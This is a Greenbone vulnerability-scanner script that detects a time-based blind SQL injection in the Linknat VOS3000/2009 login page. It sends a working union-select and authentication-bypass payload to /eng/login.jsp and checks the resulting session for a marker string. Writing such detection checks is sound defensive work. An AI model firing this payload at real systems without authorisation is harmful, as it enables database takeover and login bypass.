# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:linknat:vos";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106085");
  script_version("2025-09-09T14:09:45+0000");
  script_tag(name:"last_modification", value:"2025-09-09 14:09:45 +0000 (Tue, 09 Sep 2025)");
  script_tag(name:"creation_date", value:"2016-05-25 12:52:24 +0700 (Wed, 25 May 2016)");
  script_tag(name:"cvss_base", value:"9.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:N");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Linknat VOS3000/2009 SQL Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_linknat_vos_http_detect.nasl");
  script_mandatory_keys("linknat_vos/detected");

  script_tag(name:"summary", value:"Linknat VOS3000/2009 is prone to an SQL Injection vulnerability");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"A time-based blind SQL-Injection has been found in the login page.
  Results can be gathered from the output of welcome.jsp during the same session.");

  script_tag(name:"impact", value:"A remote attacker can gain access to the underlying database and
  manipulate it with DBA privileges.");

  script_tag(name:"affected", value:"Version 2.1.1.5, 2.1.1.8 and 2.1.2.0");

  script_tag(name:"solution", value:"Upgrade to version 2.1.2.4 or later");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/May/57");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if(!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

host = http_host_name(port: port);

data = "loginType=1&name='+union+select+1,2,3,0x53514c2d496e6a656374696f6e2d54657374,5,6#&pass='+OR+''='";

url = "/eng/login.jsp";
req = http_post_put_req(port: port, url: url, data: data,
                        add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
res = http_keepalive_send_recv(port: port, data: req);

cookie = eregmatch(string: res, pattern: "Set-Cookie: (JSESSIONID=[0-9a-z]+);", icase: TRUE);
if (!cookie)
  exit(0);

cookie = cookie[1];

if (http_vuln_check(port: port, url: "/eng/welcome.jsp", pattern: 'SQL-Injection-Test',
                    cookie: cookie)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
